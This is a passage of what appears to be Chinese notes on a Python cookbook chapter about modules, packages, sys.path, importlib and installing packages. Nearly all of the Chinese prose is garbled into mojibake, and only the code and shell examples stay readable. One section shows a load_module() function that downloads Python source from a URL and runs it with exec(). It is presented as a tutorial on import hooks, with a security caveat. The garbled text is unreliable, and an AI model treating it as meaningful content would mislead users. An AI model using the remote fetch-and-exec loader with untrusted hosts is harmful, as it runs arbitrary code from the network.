èƒ½å¤Ÿå·¥ä½œã€‚ è®¨è®º åœ¨è¿™é‡Œå·¥ä½œçš„æœºåˆ¶è¢«ç§°ä¸º\"åŒ…å‘½åç©ºé—´\"çš„ä¸€ä¸ªç‰¹å¾ã€‚ä»æœ¬è´¨ä¸Šè®²ï¼ŒåŒ…å‘½åç©ºé—´æ˜¯ ä¸€ç§ç‰¹æ®Šçš„å°è£…è®¾è®¡ï¼Œä¸ºåˆå¹¶ä¸åŒçš„ç›®å½•çš„ä»£ç åˆ°ä¸€ä¸ªå…±åŒçš„å‘½åç©ºé—´ã€‚å¯¹äºå¤§çš„æ¡† æ¶ï¼Œè¿™å¯èƒ½æ˜¯æœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒå…è®¸ä¸€ä¸ªæ¡†æ¶çš„éƒ¨åˆ†è¢«å•ç‹¬åœ°å®‰è£…ä¸‹è½½ã€‚å®ƒä¹Ÿä½¿äººä»¬èƒ½å¤Ÿ è½»æ¾åœ°ä¸ºè¿™æ ·çš„æ¡†æ¶ç¼–å†™ç¬¬ä¸‰æ–¹é™„åŠ ç»„ä»¶å’Œå…¶ä»–æ‰©å±•ã€‚ åŒ…å‘½åç©ºé—´çš„å…³é”®æ˜¯ç¡®ä¿é¡¶çº§ç›®å½•ä¸­æ²¡æœ‰ __init__.py æ–‡ä»¶æ¥ä½œä¸ºå…±åŒçš„å‘½åç©º é—´ã€‚ç¼ºå¤± __init__.py æ–‡ä»¶ä½¿å¾—åœ¨å¯¼å…¥åŒ…çš„æ—¶å€™ä¼šå‘ç”Ÿæœ‰è¶£çš„äº‹æƒ…ï¼šè¿™å¹¶æ²¡æœ‰äº§ç”Ÿé”™ è¯¯ï¼Œè§£é‡Šå™¨åˆ›å»ºäº†ä¸€ä¸ªç”±æ‰€æœ‰åŒ…å«åŒ¹é…åŒ…åçš„ç›®å½•ç»„æˆçš„åˆ—è¡¨ã€‚ç‰¹æ®Šçš„åŒ…å‘½åç©ºé—´æ¨¡å— è¢«åˆ›å»ºï¼Œåªè¯»çš„ç›®å½•åˆ—è¡¨å‰¯æœ¬è¢«å­˜å‚¨åœ¨å…¶ __path__ å˜é‡ä¸­ã€‚ä¸¾ä¸ªä¾‹å­: >>> import spam >>> spam.__path__ _NamespacePath(['foo-package/spam', 'bar-package/spam']) >>> åœ¨å®šä½åŒ…çš„å­ç»„ä»¶æ—¶ï¼Œç›®å½• __path__ å°†è¢«ç”¨åˆ° (ä¾‹å¦‚, å½“å¯¼å…¥ spam.grok æˆ–è€… spam.blah çš„æ—¶å€™) åŒ…å‘½åç©ºé—´çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹æ˜¯ä»»ä½•äººéƒ½å¯ä»¥ç”¨è‡ªå·±çš„ä»£ç æ¥æ‰©å±•å‘½åç©ºé—´ã€‚ ä¸¾ä¸ª ä¾‹å­ï¼Œå‡è®¾ä½ è‡ªå·±çš„ä»£ç ç›®å½•åƒè¿™æ ·: my-package/ spam/ custom.py å¦‚æœä½ å°†ä½ çš„ä»£ç ç›®å½•å’Œå…¶ä»–åŒ…ä¸€èµ·æ·»åŠ åˆ° sys.pathï¼Œè¿™å°†æ— ç¼åœ°åˆå¹¶åˆ°åˆ«çš„ spam åŒ…ç›®å½•ä¸­: >>> import spam.custom >>> import spam.grok >>> import spam.blah >>> ä¸€ä¸ªåŒ…æ˜¯å¦è¢«ä½œä¸ºä¸€ä¸ªåŒ…å‘½åç©ºé—´çš„ä¸»è¦æ–¹æ³•æ˜¯æ£€æŸ¥å…¶ __file__ å±æ€§ã€‚å¦‚æœæ²¡ æœ‰ï¼Œé‚£åŒ…æ˜¯ä¸ªå‘½åç©ºé—´ã€‚è¿™ä¹Ÿå¯ä»¥ç”±å…¶å­—ç¬¦è¡¨ç°å½¢å¼ä¸­çš„\"namespace\"è¿™ä¸ªè¯ä½“ç°å‡º æ¥: >>> spam.__file__ Traceback (most recent call last): File \"<stdin>\", line 1, in <module> AttributeError: 'module' object has no attribute '__file__' >>> spam <module 'spam' (namespace)> >>> é‡æ–°åŠ è½½æ¨¡å— é—®é¢˜ ä½ æƒ³é‡æ–°åŠ è½½å·²ç»åŠ è½½çš„æ¨¡å—ï¼Œå› ä¸ºä½ å¯¹å…¶æºç è¿›è¡Œäº†ä¿®æ”¹ã€‚ è§£å†³æ–¹æ¡ˆ ä½¿ç”¨ imp.reload() æ¥é‡æ–°åŠ è½½å…ˆå‰åŠ è½½çš„æ¨¡å—ã€‚ä¸¾ä¸ªä¾‹å­: >>> import spam >>> import imp >>> imp.reload(spam) <module 'spam' from './spam.py'> >>> è®¨è®º é‡æ–°åŠ è½½æ¨¡å—åœ¨å¼€å‘å’Œè°ƒè¯•è¿‡ç¨‹ä¸­å¸¸å¸¸å¾ˆæœ‰ç”¨ã€‚ä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­çš„ä»£ç ä½¿ç”¨ä¼šä¸ å®‰å…¨ï¼Œå› ä¸ºå®ƒå¹¶ä¸æ€»æ˜¯åƒæ‚¨æœŸæœ›çš„é‚£æ ·å·¥ä½œã€‚ reload() æ“¦é™¤äº†æ¨¡å—åº•å±‚å­—å…¸çš„å†…å®¹ï¼Œå¹¶é€šè¿‡é‡æ–°æ‰§è¡Œæ¨¡å—çš„æºä»£ç æ¥åˆ·æ–°å®ƒã€‚æ¨¡ å—å¯¹è±¡æœ¬èº«çš„èº«ä»½ä¿æŒä¸å˜ã€‚å› æ­¤ï¼Œè¯¥æ“ä½œåœ¨ç¨‹åºä¸­æ‰€æœ‰å·²ç»è¢«å¯¼å…¥äº†çš„åœ°æ–¹æ›´æ–°äº†æ¨¡ å—ã€‚ æ³¨è§£ åƒ from module import name è¿™æ ·å¯¼å…¥çš„ä¸ä¼šæ›´æ–° å› æ­¤ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯èƒ½éœ€è¦é¿å…é‡æ–°åŠ è½½æ¨¡å— è¿è¡Œç›®å½•æˆ–å‹ç¼©æ–‡ä»¶ é—®é¢˜ æ‚¨æœ‰ä¸€ä¸ªå·²æˆé•¿ä¸ºåŒ…å«å¤šä¸ªæ–‡ä»¶çš„åº”ç”¨ï¼Œå®ƒå·²è¿œä¸å†æ˜¯ä¸€ä¸ªç®€å•çš„è„šæœ¬ï¼Œä½ æƒ³å‘ç”¨ æˆ·æä¾›ä¸€äº›ç®€å•çš„æ–¹æ³•è¿è¡Œè¿™ä¸ªç¨‹åºã€‚ è§£å†³æ–¹æ¡ˆ å¦‚æœä½ çš„åº”ç”¨ç¨‹åºå·²ç»æœ‰å¤šä¸ªæ–‡ä»¶ï¼Œä½ å¯ä»¥æŠŠä½ çš„åº”ç”¨ç¨‹åºæ”¾è¿›å®ƒè‡ªå·±çš„ç›®å½•å¹¶ æ·»åŠ ä¸€ä¸ª __main__.py æ–‡ä»¶ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½ å¯ä»¥åƒè¿™æ ·åˆ›å»ºç›®å½•: myapplication/ spam.py bar.py grok.py __main__.py å¦‚æœ __main__.py å­˜åœ¨ï¼Œä½ å¯ä»¥ç®€å•åœ°åœ¨é¡¶çº§ç›®å½•è¿è¡Œ Python è§£é‡Šå™¨: bash % python3 myapplication è§£é‡Šå™¨å°†æ‰§è¡Œ __main__.py æ–‡ä»¶ä½œä¸ºä¸»ç¨‹åºã€‚ å¦‚æœä½ å°†ä½ çš„ä»£ç æ‰“åŒ…æˆ zip æ–‡ä»¶ï¼Œè¿™ç§æŠ€æœ¯åŒæ ·ä¹Ÿé€‚ç”¨ï¼Œä¸¾ä¸ªä¾‹å­: bash % ls spam.py bar.py grok.py __main__.py bash % zip -r myapp.zip *.py bash % python3 myapp.zip ... output from __main__.py ... è®¨è®º åˆ›å»ºä¸€ä¸ªç›®å½•æˆ– zip æ–‡ä»¶å¹¶æ·»åŠ  __main__.py æ–‡ä»¶æ¥å°†ä¸€ä¸ªæ›´å¤§çš„ Python åº”ç”¨ æ‰“åŒ…æ˜¯å¯è¡Œçš„ã€‚è¿™å’Œä½œä¸ºæ ‡å‡†åº“è¢«å®‰è£…åˆ° Python åº“çš„ä»£ç åŒ…æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«çš„ã€‚ç›¸åï¼Œ è¿™åªæ˜¯è®©åˆ«äººæ‰§è¡Œçš„ä»£ç åŒ…ã€‚ ç”±äºç›®å½•å’Œ zip æ–‡ä»¶ä¸æ­£å¸¸æ–‡ä»¶æœ‰ä¸€ç‚¹ä¸åŒï¼Œä½ å¯èƒ½è¿˜éœ€è¦å¢åŠ ä¸€ä¸ª shell è„šæœ¬ï¼Œ ä½¿æ‰§è¡Œæ›´åŠ å®¹æ˜“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä»£ç æ–‡ä»¶åä¸º myapp.zipï¼Œä½ å¯ä»¥åˆ›å»ºè¿™æ ·ä¸€ä¸ªé¡¶çº§è„šæœ¬: #!/usr/bin/env python3 /usr/local/bin/myapp.zip è¯»å–ä½äºåŒ…ä¸­çš„æ•°æ®æ–‡ä»¶ é—®é¢˜ ä½ çš„åŒ…ä¸­åŒ…å«ä»£ç éœ€è¦å»è¯»å–çš„æ•°æ®æ–‡ä»¶ã€‚ä½ éœ€è¦å°½å¯èƒ½åœ°ç”¨æœ€ä¾¿æ·çš„æ–¹å¼æ¥åš è¿™ä»¶äº‹ã€‚ è§£å†³æ–¹æ¡ˆ å‡è®¾ä½ çš„åŒ…ä¸­çš„æ–‡ä»¶ç»„ç»‡æˆå¦‚ä¸‹: mypackage/ __init__.py somedata.dat spam.py ç°åœ¨å‡è®¾ spam.py æ–‡ä»¶éœ€è¦è¯»å– somedata.dat æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚ä½ å¯ä»¥ç”¨ä»¥ä¸‹ä»£ç  æ¥å®Œæˆ: # spam.py import pkgutil data = pkgutil.get_data(__package__, 'somedata.dat') ç”±æ­¤äº§ç”Ÿçš„å˜é‡æ˜¯åŒ…å«è¯¥æ–‡ä»¶çš„åŸå§‹å†…å®¹çš„å­—èŠ‚å­—ç¬¦ä¸²ã€‚ è®¨è®º è¦è¯»å–æ•°æ®æ–‡ä»¶ï¼Œä½ å¯èƒ½ä¼šå€¾å‘äºç¼–å†™ä½¿ç”¨å†…ç½®çš„ I/ O åŠŸèƒ½çš„ä»£ç ï¼Œå¦‚ open()ã€‚ ä½†æ˜¯è¿™ç§æ–¹æ³•ä¹Ÿæœ‰ä¸€äº›é—®é¢˜ã€‚ é¦–å…ˆï¼Œä¸€ä¸ªåŒ…å¯¹è§£é‡Šå™¨çš„å½“å‰å·¥ä½œç›®å½•å‡ ä¹æ²¡æœ‰æ§åˆ¶æƒã€‚å› æ­¤ï¼Œç¼–ç¨‹æ—¶ä»»ä½• I/O æ“ ä½œéƒ½å¿…é¡»ä½¿ç”¨ç»å¯¹æ–‡ä»¶åã€‚ç”±äºæ¯ä¸ªæ¨¡å—åŒ…å«æœ‰å®Œæ•´è·¯å¾„çš„ __file__ å˜é‡ï¼Œè¿™å¼„æ¸…æ¥š å®ƒçš„è·¯å¾„ä¸æ˜¯ä¸å¯èƒ½ï¼Œä½†å®ƒå¾ˆå‡Œä¹±ã€‚ ç¬¬äºŒï¼ŒåŒ…é€šå¸¸å®‰è£…ä½œä¸º.zip æˆ–.egg æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å¹¶ä¸åƒåœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä¸€ä¸ªæ™®é€š ç›®å½•é‡Œé‚£æ ·è¢«ä¿å­˜ã€‚å› æ­¤ï¼Œä½ è¯•å›¾ç”¨ open() å¯¹ä¸€ä¸ªåŒ…å«æ•°æ®æ–‡ä»¶çš„å½’æ¡£æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œ å®ƒæ ¹æœ¬ä¸ä¼šå·¥ä½œã€‚ pkgutil.get_data() å‡½æ•°æ˜¯ä¸€ä¸ªè¯»å–æ•°æ®æ–‡ä»¶çš„é«˜çº§å·¥å…·ï¼Œä¸ç”¨ç®¡åŒ…æ˜¯å¦‚ä½•å®‰è£…ä»¥ åŠå®‰è£…åœ¨å“ªã€‚å®ƒåªæ˜¯å·¥ä½œå¹¶å°†æ–‡ä»¶å†…å®¹ä»¥å­—èŠ‚å­—ç¬¦ä¸²è¿”å›ç»™ä½  get_data() çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åŒ…å«åŒ…åçš„å­—ç¬¦ä¸²ã€‚ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨åŒ…åï¼Œä¹Ÿå¯ä»¥ä½¿ ç”¨ç‰¹æ®Šçš„å˜é‡ï¼Œæ¯”å¦‚ __package__ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯åŒ…å†…æ–‡ä»¶çš„ç›¸å¯¹åç§°ã€‚å¦‚æœæœ‰å¿…è¦ï¼Œ å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„ Unix å‘½åè§„èŒƒåˆ°ä¸åŒçš„ç›®å½•ï¼Œåªæœ‰æœ€åçš„ç›®å½•ä»ç„¶ä½äºåŒ…ä¸­ã€‚ å°†æ–‡ä»¶å¤¹åŠ å…¥åˆ° sys.path é—®é¢˜ ä½ æ— æ³•å¯¼å…¥ä½ çš„ Python ä»£ç å› ä¸ºå®ƒæ‰€åœ¨çš„ç›®å½•ä¸åœ¨ sys.path é‡Œã€‚ä½ æƒ³å°†æ·»åŠ æ–°ç›® å½•åˆ° Python è·¯å¾„ï¼Œä½†æ˜¯ä¸æƒ³ç¡¬é“¾æ¥åˆ°ä½ çš„ä»£ç ã€‚ è§£å†³æ–¹æ¡ˆ æœ‰ä¸¤ç§å¸¸ç”¨çš„æ–¹å¼å°†æ–°ç›®å½•æ·»åŠ åˆ° sys.pathã€‚ç¬¬ä¸€ç§ï¼Œä½ å¯ä»¥ä½¿ç”¨ PYTHONPATH ç¯å¢ƒå˜é‡æ¥æ·»åŠ ã€‚ä¾‹å¦‚: bash % env PYTHONPATH=/some/dir:/other/dir python3 Python 3.3.0 (default, Oct 4 2012, 10:17:33) [GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> import sys >>> sys.path ['', '/some/dir', '/other/dir', ...] >>> åœ¨è‡ªå®šä¹‰åº”ç”¨ç¨‹åºä¸­ï¼Œè¿™æ ·çš„ç¯å¢ƒå˜é‡å¯åœ¨ç¨‹åºå¯åŠ¨æ—¶è®¾ç½®æˆ–é€šè¿‡ shell è„šæœ¬ã€‚ ç¬¬äºŒç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ª.pth æ–‡ä»¶ï¼Œå°†ç›®å½•åˆ—ä¸¾å‡ºæ¥ï¼Œåƒè¿™æ ·: # myapplication.pth /some/dir /other/dir è¿™ä¸ª.pth æ–‡ä»¶éœ€è¦æ”¾åœ¨æŸä¸ª Python çš„ site-packages ç›®å½•ï¼Œé€šå¸¸ä½äº/usr/local/ lib/python3.3/site-packages æˆ–è€… ~/.local/lib/python3.3/sitepackagesã€‚å½“è§£é‡Šå™¨å¯åŠ¨æ—¶ï¼Œ .pth æ–‡ä»¶é‡Œåˆ—ä¸¾å‡ºæ¥çš„å­˜åœ¨äºæ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•å°†è¢«æ·»åŠ åˆ° sys.pathã€‚å®‰è£…ä¸€ä¸ª.pth æ–‡ä»¶ å¯èƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå¦‚æœå®ƒè¢«æ·»åŠ åˆ°ç³»ç»Ÿçº§çš„ Python è§£é‡Šå™¨ã€‚ è®¨è®º æ¯”èµ·è´¹åŠ›åœ°æ‰¾æ–‡ä»¶ï¼Œä½ å¯èƒ½ä¼šå€¾å‘äºå†™ä¸€ä¸ªä»£ç æ‰‹åŠ¨è°ƒèŠ‚ sys.path çš„å€¼ã€‚ä¾‹å¦‚: import sys sys.path.insert(0, '/some/dir') sys.path.insert(0, '/other/dir') è™½ç„¶è¿™èƒ½\"å·¥ä½œ\"ï¼Œå®ƒæ˜¯åœ¨å®è·µä¸­æä¸ºè„†å¼±ï¼Œåº”å°½é‡é¿å…ä½¿ç”¨ã€‚è¿™ç§æ–¹æ³•çš„é—®é¢˜æ˜¯ï¼Œ å®ƒå°†ç›®å½•åç¡¬ç¼–ç åˆ°äº†ä½ çš„æºä»£ç ã€‚å¦‚æœä½ çš„ä»£ç è¢«ç§»åˆ°ä¸€ä¸ªæ–°çš„ä½ç½®ï¼Œè¿™ä¼šå¯¼è‡´ç»´ æŠ¤é—®é¢˜ã€‚ æ›´å¥½çš„åšæ³•æ˜¯åœ¨ä¸ä¿®æ”¹æºä»£ç çš„æƒ…å†µä¸‹ï¼Œå°† path é…ç½®åˆ°å…¶ä»–åœ°æ–¹ã€‚å¦‚æœæ‚¨ä½¿ ç”¨æ¨¡å—çº§çš„å˜é‡æ¥ç²¾å¿ƒæ„é€ ä¸€ä¸ªé€‚å½“çš„ç»å¯¹è·¯å¾„ï¼Œæœ‰æ—¶ä½ å¯ä»¥è§£å†³ç¡¬ç¼–ç ç›®å½•çš„é—®é¢˜ï¼Œ æ¯”å¦‚ __file__ã€‚ä¸¾ä¸ªä¾‹å­: import sys from os.path import abspath, join, dirname sys.path.insert(0, join(abspath(dirname(__file__)), 'src')) è¿™å°† src ç›®å½•æ·»åŠ åˆ° path é‡Œï¼Œå’Œæ‰§è¡Œæ’å…¥æ­¥éª¤çš„ä»£ç åœ¨åŒä¸€ä¸ªç›®å½•é‡Œã€‚ site-packages ç›®å½•æ˜¯ç¬¬ä¸‰æ–¹åŒ…å’Œæ¨¡å—å®‰è£…çš„ç›®å½•ã€‚å¦‚æœä½ æ‰‹åŠ¨å®‰è£…ä½ çš„ä»£ç ï¼Œå®ƒå°† è¢«å®‰è£…åˆ° site-packages ç›®å½•ã€‚è™½ç„¶ç”¨äºé…ç½® path çš„.pth æ–‡ä»¶å¿…é¡»æ”¾ç½®åœ¨ site-packages é‡Œï¼Œä½†å®ƒé…ç½®çš„è·¯å¾„å¯ä»¥æ˜¯ç³»ç»Ÿä¸Šä»»ä½•ä½ å¸Œæœ›çš„ç›®å½•ã€‚å› æ­¤ï¼Œä½ å¯ä»¥æŠŠä½ çš„ä»£ç æ”¾åœ¨ä¸€ ç³»åˆ—ä¸åŒçš„ç›®å½•ï¼Œåªè¦é‚£äº›ç›®å½•åŒ…å«åœ¨.pth æ–‡ä»¶é‡Œã€‚ é€šè¿‡å­—ç¬¦ä¸²åå¯¼å…¥æ¨¡å— é—®é¢˜ ä½ æƒ³å¯¼å…¥ä¸€ä¸ªæ¨¡å—ï¼Œä½†æ˜¯æ¨¡å—çš„åå­—åœ¨å­—ç¬¦ä¸²é‡Œã€‚ä½ æƒ³å¯¹å­—ç¬¦ä¸²è°ƒç”¨å¯¼å…¥å‘½ä»¤ã€‚ è§£å†³æ–¹æ¡ˆ ä½¿ç”¨ importlib.import_module() å‡½æ•°æ¥æ‰‹åŠ¨å¯¼å…¥åå­—ä¸ºå­—ç¬¦ä¸²ç»™å‡ºçš„ä¸€ä¸ªæ¨¡å—æˆ– è€…åŒ…çš„ä¸€éƒ¨åˆ†ã€‚ä¸¾ä¸ªä¾‹å­: >>> import importlib >>> math = importlib.import_module('math') >>> math.sin(2) 0.9092974268256817 >>> mod = importlib.import_module('urllib.request') >>> u = mod.urlopen('http://www.python.org') >>> import_module åªæ˜¯ç®€å•åœ°æ‰§è¡Œå’Œ import ç›¸åŒçš„æ­¥éª¤ï¼Œä½†æ˜¯è¿”å›ç”Ÿæˆçš„æ¨¡å—å¯¹è±¡ã€‚ ä½ åªéœ€è¦å°†å…¶å­˜å‚¨åœ¨ä¸€ä¸ªå˜é‡ï¼Œç„¶ååƒæ­£å¸¸çš„æ¨¡å—ä¸€æ ·ä½¿ç”¨ã€‚ å¦‚æœä½ æ­£åœ¨ä½¿ç”¨çš„åŒ…ï¼Œimport_module() ä¹Ÿå¯ç”¨äºç›¸å¯¹å¯¼å…¥ã€‚ä½†æ˜¯ï¼Œä½ éœ€è¦ç»™å®ƒä¸€ ä¸ªé¢å¤–çš„å‚æ•°ã€‚ä¾‹å¦‚: import importlib # Same as 'from . import b' b = importlib.import_module('.b', __package__) è®¨è®º ä½¿ç”¨ import_module() æ‰‹åŠ¨å¯¼å…¥æ¨¡å—çš„é—®é¢˜é€šå¸¸å‡ºç°åœ¨ä»¥æŸç§æ–¹å¼ç¼–å†™ä¿®æ”¹æˆ–è¦† ç›–æ¨¡å—çš„ä»£ç æ—¶å€™ã€‚ä¾‹å¦‚ï¼Œä¹Ÿè®¸ä½ æ­£åœ¨æ‰§è¡ŒæŸç§è‡ªå®šä¹‰å¯¼å…¥æœºåˆ¶ï¼Œéœ€è¦é€šè¿‡åç§°æ¥åŠ è½½ ä¸€ä¸ªæ¨¡å—ï¼Œé€šè¿‡è¡¥ä¸åŠ è½½ä»£ç ã€‚ åœ¨æ—§çš„ä»£ç ï¼Œæœ‰æ—¶ä½ ä¼šçœ‹åˆ°ç”¨äºå¯¼å…¥çš„å†…å»ºå‡½æ•° __import__()ã€‚å°½ç®¡å®ƒèƒ½å·¥ä½œï¼Œ ä½†æ˜¯ importlib.import_module() é€šå¸¸æ›´å®¹æ˜“ä½¿ç”¨ã€‚ é€šè¿‡é’©å­è¿œç¨‹åŠ è½½æ¨¡å— é—®é¢˜ ä½ æƒ³è‡ªå®šä¹‰ Python çš„ import è¯­å¥ï¼Œä½¿å¾—å®ƒèƒ½ä»è¿œç¨‹æœºå™¨ä¸Šé¢é€æ˜çš„åŠ è½½æ¨¡å—ã€‚ è§£å†³æ–¹æ¡ˆ é¦–å…ˆè¦æå‡ºæ¥çš„æ˜¯å®‰å…¨é—®é¢˜ã€‚æœ¬èŠ‚è®¨è®ºçš„æ€æƒ³å¦‚æœæ²¡æœ‰ä¸€äº›é¢å¤–çš„å®‰å…¨å’Œè®¤çŸ¥æœº åˆ¶çš„è¯ä¼šå¾ˆç³Ÿç³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„ä¸»è¦ç›®çš„æ˜¯æ·±å…¥åˆ†æ Python çš„ import è¯­å¥æœºåˆ¶ã€‚ å¦‚æœä½ ç†è§£äº†æœ¬èŠ‚å†…éƒ¨åŸç†ï¼Œä½ å°±èƒ½å¤Ÿä¸ºå…¶ä»–ä»»ä½•ç›®çš„è€Œè‡ªå®šä¹‰ importã€‚æœ‰äº†è¿™äº›ï¼Œè®© æˆ‘ä»¬ç»§ç»­å‘å‰èµ°ã€‚ æœ¬èŠ‚æ ¸å¿ƒæ˜¯è®¾è®¡å¯¼å…¥è¯­å¥çš„æ‰©å±•åŠŸèƒ½ã€‚æœ‰å¾ˆå¤šç§æ–¹æ³•å¯ä»¥åšè¿™ä¸ªï¼Œä¸è¿‡ä¸ºäº†æ¼”ç¤ºçš„ æ–¹ä¾¿ï¼Œæˆ‘ä»¬å¼€å§‹å…ˆæ„é€ ä¸‹é¢è¿™ä¸ª Python ä»£ç ç»“æ„: testcode/ spam.py fib.py grok/ __init__.py blah.py è¿™é‡Œçš„ç›®çš„æ˜¯å…è®¸è¿™äº›æ–‡ä»¶ä½œä¸ºæ¨¡å—è¢«è¿œç¨‹è®¿é—®ã€‚ä¹Ÿè®¸æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯å°†å®ƒä»¬ å‘å¸ƒåˆ°ä¸€ä¸ª web æœåŠ¡å™¨ä¸Šé¢ã€‚åœ¨ testcode ç›®å½•ä¸­åƒä¸‹é¢è¿™æ ·è¿è¡Œ Python: bash % cd testcode bash % python3 -m http.server 15000 Serving HTTP on 0.0.0.0 port 15000 ... æœåŠ¡å™¨è¿è¡Œèµ·æ¥åå†å¯åŠ¨ä¸€ä¸ªå•ç‹¬çš„ Python è§£é‡Šå™¨ã€‚ç¡®ä¿ä½ å¯ä»¥ä½¿ç”¨ urllib è®¿ é—®åˆ°è¿œç¨‹æ–‡ä»¶ã€‚ä¾‹å¦‚: >>> from urllib.request import urlopen >>> u = urlopen('http://localhost:15000/fib.py') >>> data = u.read().decode('utf-8') >>> print(data) # fib.py print(\"I'm fib\") def fib(n): if n < 2: return 1 else: return fib(n-1) + fib(n-2) >>> ä»è¿™ä¸ªæœåŠ¡å™¨åŠ è½½æºä»£ç æ˜¯æ¥ä¸‹æ¥æœ¬èŠ‚çš„åŸºç¡€ã€‚ä¸ºäº†æ›¿ä»£æ‰‹åŠ¨çš„é€šè¿‡ urlopen() æ¥æ”¶é›†æºæ–‡ä»¶ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå®šä¹‰ import è¯­å¥æ¥åœ¨åå°è‡ªåŠ¨å¸®æˆ‘ä»¬åšåˆ° åŠ è½½è¿œç¨‹æ¨¡å—çš„ç¬¬ä¸€ç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªæ˜¾ç¤ºçš„åŠ è½½å‡½æ•°æ¥å®Œæˆå®ƒ: import imp import urllib.request import sys def load_module(url): u = urllib.request.urlopen(url) source = u.read().decode('utf-8') mod = sys.modules.setdefault(url, imp.new_module(url)) code = compile(source, url, 'exec') mod.__file__ = url mod.__package__ = '' exec(code, mod.__dict__) return mod è¿™ä¸ªå‡½æ•°ä¼šä¸‹è½½æºä»£ç ï¼Œå¹¶ä½¿ç”¨ compile() å°†å…¶ç¼–è¯‘åˆ°ä¸€ä¸ªä»£ç å¯¹è±¡ä¸­ï¼Œç„¶ååœ¨ ä¸€ä¸ªæ–°åˆ›å»ºçš„æ¨¡å—å¯¹è±¡çš„å­—å…¸ä¸­æ¥æ‰§è¡Œå®ƒã€‚ä¸‹é¢æ˜¯ä½¿ç”¨è¿™ä¸ªå‡½æ•°çš„æ–¹å¼: >>> fib = load_module('http://localhost:15000/fib.py') I'm fib å¯¹äºç®€å•çš„æ¨¡å—è¿™ä¸ªæ˜¯è¡Œå¾—é€šçš„ã€‚ä¸è¿‡å®ƒå¹¶æ²¡æœ‰åµŒå…¥åˆ°é€šå¸¸çš„ import è¯­å¥ä¸­ï¼Œå¦‚æœè¦æ”¯æŒæ›´é«˜çº§çš„ç»“æ„æ¯”å¦‚åŒ…å°±éœ€è¦æ›´å¤šçš„å·¥ä½œäº†ã€‚ ä¸€ä¸ªæ›´é…·çš„åšæ³•æ˜¯åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰å¯¼å…¥å™¨ã€‚ç¬¬ä¸€ç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªå…ƒè·¯å¾„å¯¼å…¥å™¨ã€‚ éº»çƒ¦, æ— æ¯”éº»çƒ¦, è·³è¿‡ å¯¼å…¥æ¨¡å—çš„åŒæ—¶ä¿®æ”¹æ¨¡å— é—®é¢˜ ä½ æƒ³ç»™æŸä¸ªå·²å­˜åœ¨æ¨¡å—ä¸­çš„å‡½æ•°æ·»åŠ è£…é¥°å™¨ã€‚ä¸è¿‡ï¼Œå‰ææ˜¯è¿™ä¸ªæ¨¡å—å·²ç»è¢«å¯¼å…¥å¹¶ ä¸”è¢«ä½¿ç”¨è¿‡ã€‚ è§£å†³æ–¹æ¡ˆ è¿™é‡Œé—®é¢˜çš„æœ¬è´¨å°±æ˜¯ä½ æƒ³åœ¨æ¨¡å—è¢«åŠ è½½æ—¶æ‰§è¡ŒæŸä¸ªåŠ¨ä½œã€‚å¯èƒ½æ˜¯ä½ æƒ³åœ¨ä¸€ä¸ªæ¨¡å— è¢«åŠ è½½æ—¶è§¦å‘æŸä¸ªå›è°ƒå‡½æ•°æ¥é€šçŸ¥ä½ ã€‚ å®‰è£…ç§æœ‰çš„åŒ… é—®é¢˜ ä½ æƒ³è¦å®‰è£…ä¸€ä¸ªç¬¬ä¸‰æ–¹åŒ…ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™å°†å®ƒå®‰è£…åˆ°ç³»ç»Ÿ Python åº“ä¸­å»ã€‚æˆ–è€…ï¼Œ ä½ å¯èƒ½æƒ³è¦å®‰è£…ä¸€ä¸ªä¾›è‡ªå·±ä½¿ç”¨çš„åŒ…ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿä¸Šé¢æ‰€æœ‰ç”¨æˆ·ã€‚ è§£å†³æ–¹æ¡ˆ Python æœ‰ä¸€ä¸ªç”¨æˆ·å®‰è£…ç›®å½•ï¼Œé€šå¸¸ç±»ä¼¼\"~/.local/lib/python3.3/site-packages\"ã€‚ è¦å¼ºåˆ¶åœ¨è¿™ä¸ªç›®å½•ä¸­å®‰è£…åŒ…ï¼Œå¯ä½¿ç”¨å®‰è£…é€‰é¡¹\"â€“user\"ã€‚ä¾‹å¦‚: python3 setup.py install --user # æˆ–è€… pip install --user packagename åœ¨ sys.path ä¸­ç”¨æˆ·çš„\"site-packages\"ç›®å½•ä½äºç³»ç»Ÿçš„\"site-packages\"ç›®å½•ä¹‹å‰ã€‚ å› æ­¤ï¼Œä½ å®‰è£…åœ¨é‡Œé¢çš„åŒ…å°±æ¯”ç³»ç»Ÿå·²å®‰è£…çš„åŒ…ä¼˜å…ˆçº§é«˜ï¼ˆå°½ç®¡å¹¶ä¸æ€»æ˜¯è¿™æ ·ï¼Œè¦å–å†³äº ç¬¬ä¸‰æ–¹åŒ…ç®¡ç†å™¨ï¼Œæ¯”å¦‚ distribute æˆ– pipï¼‰ã€‚ åˆ›å»ºæ–°çš„ Python ç¯å¢ƒ é—®é¢˜ ä½ æƒ³åˆ›å»ºä¸€ä¸ªæ–°çš„ Python 